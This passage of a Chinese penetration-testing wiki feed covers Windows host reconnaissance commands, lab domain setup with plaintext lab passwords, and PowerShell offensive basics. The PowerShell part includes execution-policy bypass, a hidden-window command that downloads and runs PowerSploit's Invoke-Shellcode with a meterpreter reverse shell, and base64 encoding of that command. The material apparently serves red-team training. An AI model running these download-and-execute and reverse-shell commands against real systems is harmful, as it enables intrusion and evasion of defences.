class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\sf.log&quot;</span><br></pre></td></tr></table></figure><h4 id="查看代理配置情况"><a href="#查看代理配置情况" class="headerlink" title="查看代理配置情况"></a><strong>查看代理配置情况</strong></h4><p>执行reg命令，查看服务器1080端口的代理配置情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/25.png"></p><h4 id="查询并开启连接服务"><a href="#查询并开启连接服务" class="headerlink" title="查询并开启连接服务"></a><strong>查询并开启连接服务</strong></h4><p>查看远程连接端口，利用reg命令，连接端口为0xd3d，即3389</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/26.png"></p><p>在Windows server 2003中开启3389端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (_CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><p>在Windows server 2008和Windows server 2012中开启3389端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (_CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser</span><br></pre></td></tr></table></figure><h2 id="自动收集信息"><a href="#自动收集信息" class="headerlink" title="自动收集信息"></a>自动收集信息</h2><p>自动收集信息脚本，执行完毕生成一个HTML文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%A in (&#x27;dir /s /b %WINDIR%\system32\*htable.xsl&#x27;) do set &quot;var=%%A&quot;</span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic group list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled=&#x27;true&#x27; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/27.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Metadata&quot;&gt;&lt;a href=&quot;#Metadata&quot; class=&quot;headerlink&quot; title=&quot;Metadata&quot;&gt;&lt;/a&gt;Metadata&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;th&gt;Tahir&lt;/t</summary>
      
    
    
    
    <category term="4. 内网安全攻防" scheme="http://example.com/categories/4-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"/>
    
    <category term="1-内网信息搜集" scheme="http://example.com/categories/4-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
    
    <category term="1-内网信息搜集" scheme="http://example.com/tags/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>部署域环境</title>
    <link href="http://example.com/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/"/>
    <id>http://example.com/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/</id>
    <published>2021-08-04T03:09:52.000Z</published>
    <updated>2021-08-04T03:33:20.251Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h2><table><thead><tr><th>Author</th><th>Tahir</th></tr></thead><tbody><tr><td>Creation Date</td><td>2021/08/04</td></tr><tr><td>Modification Date</td><td>2021/08/04</td></tr><tr><td>Tactics</td><td>None</td></tr><tr><td>Techniques</td><td>None</td></tr></tbody></table><h2 id="Tactics"><a href="#Tactics" class="headerlink" title="Tactics"></a>Tactics</h2><p>None</p><h2 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h2><p>None</p><h2 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h2><h2 id="搭建域环境"><a href="#搭建域环境" class="headerlink" title="搭建域环境"></a>搭建域环境</h2><p>Windows Server 2012  10.251.0.37 域控制器 administrator Password!</p><p>Windows 7 10.251.0.32 域成员 TEST\testuser  Password!</p><h3 id="域控制器配置"><a href="#域控制器配置" class="headerlink" title="域控制器配置"></a>域控制器配置</h3><p>设置服务器，配置Windows Server 2012 R2操作系统，IP为10.251.0.37，子网掩码为255.255.255.0，DNS设置为本机IP地址。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/5.png"></p><h4 id="安装域控制器"><a href="#安装域控制器" class="headerlink" title="安装域控制器"></a>安装域控制器</h4><p>在Windows Server 2012上添加AD域服务</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/1.png"></p><p>一路默认设置，直到点击安装为止，安装完成后，配置AD域控制器。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/2.png"></p><p>在active director域服务配置向导，添加新林，输入test.domain.</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/3.png"></p><p>在域控制器选项中，将林功能级别、域功能级别都设置为Windows Server 2012，创建域林时，在默认情况下应选择DNS服务器，林中的第一个域控制器必须是全局目录服务器且不能是只读域控制器（RODC），然后，设置目录服务还原模式的密码为Password!（在开机进入安全模式修复活动目录数据库时将使用此密码）。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/6.png"></p><p>在DNS选项部分会出现关于DNS的警告，不用管该警告，保持默认设置。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/7.png"></p><p>点击下一步，进入其它选项，在NetBIOS域名（不支持DNS域名的旧版本操作系统，如Windows 98、NT，需要通过NetBIOS域名进行通信）部分保持默认设置。点击下一步，直到出现安装按钮为止。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/8.png"></p><h4 id="安装DNS服务"><a href="#安装DNS服务" class="headerlink" title="安装DNS服务"></a>安装DNS服务</h4><p>同上，点击下一步，保持默认设置，直到安装。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/4.png"></p><p>安装完上面服务后，重启服务器，使用域管理员账户（TEST\administrator）登录，在服务器管理界面可以看到AD DS、DNS服务了</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/9.png"></p><h4 id="创建Active-Directory用户"><a href="#创建Active-Directory用户" class="headerlink" title="创建Active Directory用户"></a>创建Active Directory用户</h4><p>为域用户创建域控制器账户，在Active Directory用户和计算机界面中选择Users目录并单击右键，使用弹出的快捷菜单添加用户testuser/ Password!。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/12.png"></p><h3 id="域用户配置"><a href="#域用户配置" class="headerlink" title="域用户配置"></a>域用户配置</h3><p>将Windows 7计算机添加到该域中。设置IP地址为10.251.0.32，设置DNS地址为10.251.0.37，运行ping test.domain测试</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/11.png"></p><p>将主机添加到域中，输入域控制器的管理员账户和密码。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/13.png"></p><p>点击确定后，弹出欢迎加入域的提示。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/14.png"></p><p>最后重启计算机，用域控创建的testuser用户登录域。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/15.png"></p><p>在Windows 7中测试域环境，输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><p>报错6118</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/17.png"></p><p>在Windows 7中。</p><p>1.右键单击“我的电脑”，进入“管理”&gt;“服务”，启动“Computer Brower”服务，若无法启动，请确认“Server”和“WorkStation”两项服务已开启，并设置“Computer Brower”服务属性为“手动启动”。</p><p>2.关闭防火墙</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/16.png"></p><p>再次输入命令，可以看到域环境搭建成功。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/18.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Metadata&quot;&gt;&lt;a href=&quot;#Metadata&quot; class=&quot;headerlink&quot; title=&quot;Metadata&quot;&gt;&lt;/a&gt;Metadata&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;th&gt;Tahir&lt;/t</summary>
      
    
    
    
    <category term="4. 内网安全攻防" scheme="http://example.com/categories/4-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"/>
    
    <category term="0-内网攻防基础" scheme="http://example.com/categories/4-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="0-内网攻防基础" scheme="http://example.com/tags/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>PowerShell基础</title>
    <link href="http://example.com/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/</id>
    <published>2021-08-04T03:03:24.000Z</published>
    <updated>2021-08-04T03:33:55.622Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h2><table><thead><tr><th>Author</th><th>Tahir</th></tr></thead><tbody><tr><td>Creation Date</td><td>2021/08/04</td></tr><tr><td>Modification Date</td><td>2021/08/04</td></tr><tr><td>Tactics</td><td>Null</td></tr><tr><td>Techniques</td><td>Null</td></tr></tbody></table><h2 id="Tactics"><a href="#Tactics" class="headerlink" title="Tactics"></a>Tactics</h2><p>Null</p><h2 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h2><p>Windows PowerShell是一种命令行外壳程序和脚本环境。它内置在每个Windows版本中（Windows 7或者Windows Server 2008 R2及更高版本），为Windows命令行使用者和脚本编写者利用.NET Framework的强大功能提供了遍历。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.psl）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。也可以把PowerShell看作命令行提示符cmd.exe的扩展。</p><p>PowerShell需要.NET环境的支持，同时支持.NET对象，其可读性、易用性居所有Shell之首。PowerShell的这些特点，使它逐渐成为一个非常流行的安全测试工具。</p><p>PowerShell具有以下特点：</p><ul><li>在Windows 7以上版本的操作系统中是默认安装的</li><li>脚本可以在内存中运行，不需要写入磁盘</li><li>几乎不触发杀毒软件</li><li>可以远程执行</li><li>目前很多工具都是基于PowerShell开发的</li><li>使Windows脚本的执行变得容易</li><li>cmd.exe的运行通常会被阻止，但是PowerShell的运行通常不会被阻止</li><li>可用于管理活动目录</li></ul><p>可以输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-Host</span><br><span class="line">或者</span><br><span class="line">$PSVersionTable.PSVERSION</span><br></pre></td></tr></table></figure><p>命令查看PowerShell的版本</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/1.png"></p><p>Windows操作系统对应的PowerShell版本：</p><table><thead><tr><th>操作系统</th><th>PowerShell</th><th>是否可升级</th></tr></thead><tbody><tr><td>Windows 7/Windows Server 2008</td><td>2.0</td><td>可升级</td></tr><tr><td>Windows 8/Windows Server 2012</td><td>3.0</td><td>可升级</td></tr><tr><td>Windows 8.1/Windows Server 2012 R2</td><td>4.0</td><td>否</td></tr></tbody></table><h3 id="PowerShell的基本概念"><a href="#PowerShell的基本概念" class="headerlink" title="PowerShell的基本概念"></a>PowerShell的基本概念</h3><h4 id="ps1文件"><a href="#ps1文件" class="headerlink" title=".ps1文件"></a>.ps1文件</h4><p>一个PowerShell脚本其实是一个简单的文本文件，其扩展名为.ps1。PowerShell脚本文件中包含一系列的PowerShell命令，每个命令显示为独立的一行。</p><h4 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h4><p>为了防止运行恶意脚本，PowerShell提供了一个执行策略。在默认情况下，这个执行策略被设置为“不能执行”。</p><p>如果PowerShell脚本无法执行，可以使用下面的cmdlet命令查询当前的执行策略，默认设置为Restricted，不能运行脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ExecutionPolicy</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/2.png"></p><p>有4中执行策略可以设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Restricted  脚本不能运行</span><br><span class="line">RemoteSigned  在本地创建的脚本可以运行，但是从网上下载的脚本不能运行（拥有签名的除外）</span><br><span class="line">AllSigned  仅当脚本由受信任的发布者签名时才能运行</span><br><span class="line">Unrestricted  允许所有脚本运行</span><br></pre></td></tr></table></figure><p>可以用下面的命令设置以上执行策略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy [policy name]</span><br></pre></td></tr></table></figure><h3 id="PowerShell常用命令"><a href="#PowerShell常用命令" class="headerlink" title="PowerShell常用命令"></a>PowerShell常用命令</h3><h4 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h4><p>在PowerShell下，类似cmd命令叫作cmdlet命令。二者的命名规范一致，都采用“动词-名词”的形式，例如“New-Item”。动词一般为Add、New、Get、Remove、Set等。命令的别名一般兼容Windows Command和Linux Shell，PowerShell不区分大小写。</p><p>下面以文件操作为例，讲解PowerShell的基本用法：</p><p>创建目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-Item whitecellclub-ItemType Directory</span><br></pre></td></tr></table></figure><p>新建文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-Item light.txt-ItemType File</span><br></pre></td></tr></table></figure><p>删除目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-Item whitecellclub</span><br></pre></td></tr></table></figure><p>显示文本内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Content test.txt</span><br></pre></td></tr></table></figure><p>设置文本内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Content test.txt-Value &quot;Hello World&quot;</span><br></pre></td></tr></table></figure><p>追加内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-Content light.txt-Value &quot;i love you&quot;</span><br></pre></td></tr></table></figure><p>清除内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Clear-Content test.txt</span><br></pre></td></tr></table></figure><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>在Windows终端下输入powershell，进入PowerShell命令行环境，输入help可以显示帮助信息。</p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/3.png"></p><p>要运行PowerShell脚本，必须使用管理员权限将策略改为Unrestricted。</p><h5 id="绕过本地权限并执行"><a href="#绕过本地权限并执行" class="headerlink" title="绕过本地权限并执行"></a>绕过本地权限并执行</h5><p>将PowerShell.ps1上传至目标服务器。在命令行中执行命令，绕过安全策略，在目标服务器上执行脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File PowerUp.ps1</span><br></pre></td></tr></table></figure><p>将同一个脚本上传至目标服务器。在本地执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -Command &quot;&amp; &#123;Import-Module C:\PowerUp.ps1; Invoke-Allchecks&#125;&quot;</span><br></pre></td></tr></table></figure><h5 id="从远端服务器中下载脚本，绕过本地权限并隐藏执行"><a href="#从远端服务器中下载脚本，绕过本地权限并隐藏执行" class="headerlink" title="从远端服务器中下载脚本，绕过本地权限并隐藏执行"></a>从远端服务器中下载脚本，绕过本地权限并隐藏执行</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonI IEX(New-ObjectNet.WebClient).DownloadString(&quot;远程下载脚本的链接&quot;); [Parameters]</span><br></pre></td></tr></table></figure><p>例子：Invoke–Shellcode.ps1一个远端的恶意ps1脚本</p><p><a href="https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1">https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1</a></p><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/4.png"></p><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonI IEX(New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1&quot;); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 127.0.0.1 -Lport 666</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/5.png"></p><p>常用参数说明：</p><ul><li>-ExecutionPolicy Bypass (-exec bypass)：绕过安全执行策略</li><li>-WindowSytle Hidden (-w hidden)：隐藏窗口</li><li>-NonInteractive (-NonI)：非交互模式。PowerShell不为用户提供交互式的提示</li><li>-NoProfile (-NoP)：PowerShell控制台不加载当前用户的配置文件</li><li>-noexit：执行后不退出shell，这个参数在使用键盘记录器等脚本时非常重要</li><li>-NoLogo：启动不显示版权标志的PowerShell</li></ul><h5 id="使用base64对命令进行编码"><a href="#使用base64对命令进行编码" class="headerlink" title="使用base64对命令进行编码"></a>使用base64对命令进行编码</h5><p>使用base64对PowerShell命令进行混淆和压缩代码。可以使用python脚本对所有PowerShell命令进行base64编码，使用ps_encoder.py进行编码时，转换对象必须是文本文件，因此要把命令保存为文本文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo IEX(New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1&quot;); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 127.0.0.1 -Lport 80 &gt; raw.txt</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/6.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 